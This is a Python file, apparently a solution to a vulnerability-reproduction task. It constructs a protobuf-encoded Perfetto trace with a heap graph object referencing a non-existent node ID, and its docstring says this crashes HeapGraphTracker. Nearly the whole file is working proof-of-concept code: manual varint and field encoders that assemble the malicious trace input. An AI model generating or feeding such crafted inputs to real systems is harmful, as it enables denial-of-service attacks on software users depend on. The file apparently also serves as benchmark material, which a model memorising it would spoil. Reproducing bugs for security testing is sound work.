import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in Perfetto's HeapGraphTracker.
        The vulnerability is a stack overflow/crash caused by referencing a non-existent node ID
        in a HeapGraph, which leads to dereferencing an invalid iterator from node_id_map.
        """
        
        def to_varint(n: int) -> bytes:
            if n == 0:
                return b'\x00'
            b = bytearray()
            while n:
                part = n & 0x7F
                n >>= 7
                if n:
                    part |= 0x80
                b.append(part)
            return bytes(b)

        def make_tag(field_num: int, wire_type: int) -> bytes:
            return to_varint((field_num << 3) | wire_type)

        def make_varint_field(field_num: int, value: int) -> bytes:
            # WireType 0: Varint
            return make_tag(field_num, 0) + to_varint(value)

        def make_length_delimited_field(field_num: int, content: bytes) -> bytes:
            # WireType 2: Length Delimited
            return make_tag(field_num, 2) + to_varint(len(content)) + content

        # 1. Construct a HeapGraphObject with a dangling reference
        # Field 1: id (uint64) = 1
        # Field 5: reference_object_id (repeated uint64, packed) = [999]
        # The ID 999 does not exist in the graph, triggering the missing check in node_id_map.
        
        dangling_id = 999
        packed_refs = to_varint(dangling_id)
        
        # Build object payload: id=1, refs=[999]
        obj_payload = make_varint_field(1, 1) + make_length_delimited_field(5, packed_refs)
        
        # 2. Construct HeapGraph message
        # Field 1: pid (int32) = 1
        # Field 2: objects (repeated HeapGraphObject) containing our malicious object
        heap_graph_payload = make_varint_field(1, 1) + make_length_delimited_field(2, obj_payload)
        
        # 3. Construct TracePacket message
        # Field 10: trusted_packet_sequence_id (uint32) = 1 (required for stateful processing)
        # Field 56: heap_graph (HeapGraph)
        packet_payload = make_varint_field(10, 1) + make_length_delimited_field(56, heap_graph_payload)
        
        # 4. Construct Root Trace message
        # Field 1: packet (repeated TracePacket)
        trace_payload = make_length_delimited_field(1, packet_payload)
        
        return trace_payload